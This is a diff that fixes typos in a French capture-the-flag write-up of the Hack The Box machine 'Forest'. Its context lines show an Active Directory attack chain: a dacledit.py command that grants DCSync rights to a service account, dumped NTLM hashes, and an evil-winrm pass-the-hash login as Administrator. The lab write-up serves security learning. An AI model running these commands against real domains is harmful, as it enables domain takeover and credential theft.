@@ -154,7 +154,7 @@ WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s
 ## Enumerate DACL
 
 <Aside type="note">
-On a besoin de configurer /etc/resolv.conf sur forest.htb.local. cela permet aux collecteurs BloodHound de faire la résolution DNS appropriée. 
+On a besoin de configurer /etc/resolv.conf sur forest.htb.local. Cela permet aux collecteurs BloodHound de faire la résolution DNS appropriée. 
 </Aside>
 
 On va utiliser BloodHound python pour énumérer correctement le domaine et essayer de trouver un vecteur d'escalade.
@@ -192,7 +192,7 @@ Verbose: [Add-DomainGroupMember] Adding member 'svc-alfresco' to group 'Exchange
 
 ### Écriture d’un nouveau DACL pour obtenir les droits DCSync
 
-En suite, nous n'avons pas encore tous les droits sur le domaine. Nous allons simplement écrire un nouveau DACL pour nous donner les droits de faire un DCSync et ainsi récupérer le hash du mot de passe de l'administrateur pour avoir les privilèges systèmes sur la machine FOREST :
+Ensuite, nous n'avons pas encore tous les droits sur le domaine. Nous allons simplement écrire un nouveau DACL pour nous donner les droits de faire un DCSync et ainsi récupérer le hash du mot de passe de l'administrateur pour avoir les privilèges systèmes sur la machine FOREST :
 
 ```bash
 dacledit.py -action write -rights DCSync -principal svc-alfresco -target-dn "DC=htb,DC=local" htb.local/svc-alfresco:svc-alfresco
@@ -218,7 +218,7 @@ htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16
 ...
 ```
 
-et Enfin, nous connecter en tant qu'Administrator via une attaque Pass The Hash.
+et enfin, nous connecter en tant qu'Administrator via une attaque Pass The Hash.
 
 ```bash
 evil-winrm -i htb.local -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
